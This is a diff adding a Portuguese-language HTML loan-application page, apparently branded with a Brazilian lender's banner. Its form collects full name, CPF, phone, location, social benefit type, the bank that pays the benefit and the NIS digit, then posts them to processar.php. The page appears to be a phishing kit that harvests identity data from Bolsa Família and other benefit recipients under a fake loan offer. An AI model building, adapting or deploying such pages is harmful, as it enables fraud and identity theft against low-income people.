@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- Metadados da página -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Empréstimo</title>
+
+    <!-- Estilos CSS -->
+    <style>
+        /* Estilos gerais */
+        body {
+            font-family: "Arial", sans-serif; /* Define a fonte padrão para o corpo do documento */
+            background-image: linear-gradient(to right, #005ca9, #31a0e0); /* Define a cor de fundo do corpo */
+            margin: 0; /* Remove margens */
+            padding: 0; /* Remove preenchimento */
+        }
+
+        #barra-fixa {
+            background-image: linear-gradient(to right, #005ca9, #31a0e0); /* Cor da barra fixa */
+            color: #fff; /* Cor do texto na barra fixa */
+            text-align: center;
+            padding: 30px;
+        }
+
+        #container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            height: 100vh;
+            justify-content: center;
+            margin-top: 100px; /* Adiciona margem superior para evitar sobreposição com a barra fixa */
+            
+        }
+
+        #banner {
+            width: 100%;
+            height: auto;
+            object-fit: contain;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column; /* Organiza os elementos internos em uma coluna */
+        }
+
+        /* Estilos para os campos de entrada de texto e e-mail */
+        input[type="text"],
+        input[type="email"] {
+            padding: 10px;
+            margin: 8px auto; /* Define margens superior e inferior para espaçamento entre os campos */
+            border: 1px solid #005ca9;
+            border-radius: 3px;
+            font-family: "Arial", sans-serif;
+            font-size: 16px;
+            width: 80%; /* Preenche toda a largura do contêiner pai */
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus {
+            border-color: #336699; /* Muda a cor da borda quando um campo está em foco */
+        }
+
+        /* Estilize os campos de seleção */
+        select {
+            padding: 10px;
+            margin: 8px auto;
+            border: 1px solid #005ca9;
+            border-radius: 3px;
+            font-family: "Arial", sans-serif;
+            font-size: 16px;
+            width: 80%;
+        }
+
+        /* Estilize o campo de seleção quando estiver em foco */
+        select:focus {
+            border-color: #336699; /* Muda a cor da borda quando o campo está em foco */
+        }
+
+        /* Estilize o campo de seleção quando o mouse passar por cima (hover) */
+        select:hover {
+            border-color: #336699; /* Muda a cor da borda quando o mouse passa por cima do campo */
+        }
+
+        /* Estilos para campos de seleção em dispositivos móveis */
+        @media (max-width: 768px) {
+            select {
+                width: 90%; /* Redimensiona a largura para caber na tela menor */
+                margin: 8px auto;
+            }
+        }
+
+        button {
+            background-color: #f29200; /* Define a cor de fundo do botão */
+            color: #fff; /* Define a cor do texto do botão */
+            padding: 15px 60px; /* Adiciona preenchimento interno ao botão */
+            border: none; /* Remove a borda do botão */
+            cursor: pointer; /* Muda o cursor para uma mão quando passa o mouse sobre o botão */
+            margin-top: 15px; /* Define uma margem superior para espaçamento entre os campos e o botão */
+            border-radius: 3px;
+            font-family: "Arial", sans-serif;
+            font-size: 16px;
+            margin-bottom: 70px;
+        }
+
+        /* Espaçamento abaixo do campo de CEP */
+        #cep {
+            margin-bottom: 30px; /* Adiciona um espaçamento extra abaixo do campo CEP */
+        }
+
+        /* Espaçamento abaixo do campo de CPF */
+        #cpf {
+            margin-bottom: 25px; /* Adiciona um espaçamento extra abaixo do campo CPF */
+        }
+
+        /* Estilos para dispositivos móveis */
+        @media (max-width: 768px) {
+            #form-container {
+                max-width: 90%; /* Redimensiona o contêiner do formulário para caber na tela pequena */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="barra-fixa">
+        <!-- Conteúdo da barra fixa, como logotipo ou texto -->
+    </div>
+    <div id="container">
+        <img id="banner" src="imagenscrefisa/bannercrefisa.png" alt="Banner">
+        <div id="form-container">
+            <form action="processar.php" method="post" onsubmit="return validarFormulario(this);">
+                <h2 style="font-family: 'Arial', sans-serif; color: #ebe0e0;">PREENCHA O FORMULÁRIO E CONTRATE O SEU EMPRÉSTIMO.</h2>
+                <!-- Campos de entrada de texto e e-mail -->
+                <input type="text" name="nome" id="nome" placeholder="Digite Seu Nome Completo:" maxlength="40" required>
+                <input type="text" name= "cpf" id="cpf" placeholder="Digite Seu CPF:" maxlength="14" oninput="formatarCPF(this)" required>
+                <input type="text" name="telefone" id="telefone" placeholder="Digite Seu Telefone:" maxlength="13" oninput="formatarTelefone(this)" required>
+                <input type="text" name="estado" id="estado" placeholder="Digite Seu Estado:" maxlength="50" required>
+                <input type="text" name="cidade" id="cidade" placeholder="Digite Sua Cidade:" maxlength="50" required>
+                <!-- Campos selecionáveis -->
+                <select name="beneficio" required>
+                    <option value="" disabled selected>Selecione Seu Benefício</option>
+                    <option value="Bolsa Família">Bolsa Família</option>
+                    <option value="Auxílios">Auxílios</option>
+                    <option value="PIS/Pasep">PIS/Pasep</option>
+                    <option value="FGTS">FGTS</option>
+                </select>
+                <select name="banco" required>
+                    <option value="" disabled selected>Banco que recebe o benefício</option>
+                    <option value="Caixa Tem">Caixa Tem</option>
+                    <option value="Caixa">Caixa</option>
+                    <option value="Cartão">Cartão Bolsa Família</option>
+                    <option value="Outros">Outros</option>
+                </select>
+                <select name="data_beneficio" required>
+                    <option value="" disabled selected>Selecione o dígito do seu NIS</option>
+                    <option value="NIS 1">NIS 1</option>
+                    <option value="NIS 2">NIS 2</option>
+                    <option value="NIS 3">NIS 3</option>
+                    <option value="NIS 4">NIS 4</option>
+                    <option value="NIS 5">NIS 5</option>
+                    <option value="NIS 6">NIS 6</option>
+                    <option value="NIS 7">NIS 7</option>
+                    <option value="NIS 8">NIS 8</option>
+                    <option value="NIS 9">NIS 9</option>
+                    <option value="NIS 0">NIS 0</option>
+                </select>
+                <!-- Botão "Continuar" -->
+                <button type="submit">CONTINUAR</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Funções JavaScript para formatar CPF, telefone e CEP
+        function formatarCPF(campo) {
+            var cpf = campo.value.replace(/\D/g, '');
+            if (cpf.length <= 3) {
+                campo.value = cpf;
+            } else if (cpf.length <= 6) {
+                campo.value = cpf.replace(/(\d{3})(\d{0,3})/, '$1.$2');
+            } else if (cpf.length <= 9) {
+                campo.value = cpf.replace(/(\d{3})(\d{3})(\d{0,3})/, '$1.$2.$3');
+            } else {
+                campo.value = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{0,2})/, '$1.$2.$3-$4');
+            }
+        }
+
+        function formatarTelefone(campo) {
+            var telefone = campo.value.replace(/\D/g, '');
+            if (telefone.length <= 2) {
+                campo.value = telefone;
+            } else if (telefone.length <= 7) {
+                campo.value = telefone.replace(/(\d{2})(\d{0,5})/, '$1 $2');
+            } else {
+                campo.value = telefone.replace(/(\d{2})(\d{5})(\d{0,4})/, '$1 $2-$3');
+            }
+        }
+
+        function validarFormulario(form) {
+            var inputs = form.getElementsByTagName('input');
+            for (var i = 0; i < inputs.length; i++) {
+                if (inputs[i].hasAttribute('required') && !inputs[i].value) {
+                    alert('Por favor, preencha todos os campos obrigatórios.');
+                    return false;
+                }
+            }
+
+            var selects = form.getElementsByTagName('select');
+            for (var i = 0; i < selects.length; i++) {
+                if (selects[i].hasAttribute('required') && selects[i].value === "") {
+                    alert('Por favor, selecione uma opção em todos os campos obrigatórios.');
+                    return false;
+                }
+            }
+
+            return true;
+
+            
+        }
+        
+    </script>
+</body>
+</html>
